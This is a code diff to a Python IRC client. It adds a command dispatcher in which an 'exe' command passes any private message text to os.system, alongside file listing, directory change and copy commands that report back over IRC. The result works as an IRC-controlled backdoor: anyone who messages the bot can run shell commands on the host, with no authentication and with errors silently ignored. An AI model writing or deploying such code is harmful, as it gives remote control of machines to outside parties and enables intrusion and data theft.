@@ -33,7 +33,7 @@ class IRC:
         self.online = True
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.connect((self.server, self.port))
-        time.sleep(0.5)
+        time.sleep(0.3)
         self.recvThread = threading.Thread(target = self.response)
         self.recvThread.start()
         self.send_raw(f'USER {self.name} . . :{self.name}')
@@ -49,7 +49,7 @@ class IRC:
     def response(self):
         while self.online:
             try:
-                time.sleep(0.2)
+                #time.sleep(0.1)
                 resp = self.socket.recv(512).decode('UTF-8')
                 if resp.find('PING') != -1:
                     self.send_raw('PONG ' + resp.split()[1])
@@ -60,6 +60,16 @@ class IRC:
             except:
                 pass
 
+def send(name, string):
+    irc.send(name, string)
+
+functions = {
+    'exe': lambda n, x: os.system(' '.join(x[1:])),
+    'ls': lambda n, x: send(n, filemanager.list()),
+    'pwd': lambda n, x: send(n, filemanager.pwd()),
+    'cd': lambda n, x: filemanager.cd(x[1]),
+    'cp': lambda n, x: filemanager.cp(x[1], x[2]),
+}
 
 if __name__ == '__main__':
     irc = IRC()
@@ -73,10 +83,12 @@ if __name__ == '__main__':
                 if len(args) != 0:
                     if args[0] == 'PRIVMSG':
                         name = prefix.split('!')[0]
-                        if line == 'ls':
-                            irc.send(name, filemanager.list())
-                        elif line == 'pwd':
-                            irc.send(name, filemanager.pwd())
+                        line_ = line.split()
+                        if line_[0] in functions:
+                            try:
+                                functions[line_[0]](name, line_)
+                            except:
+                                pass
                     
         except KeyboardInterrupt:
             irc.disconnect()
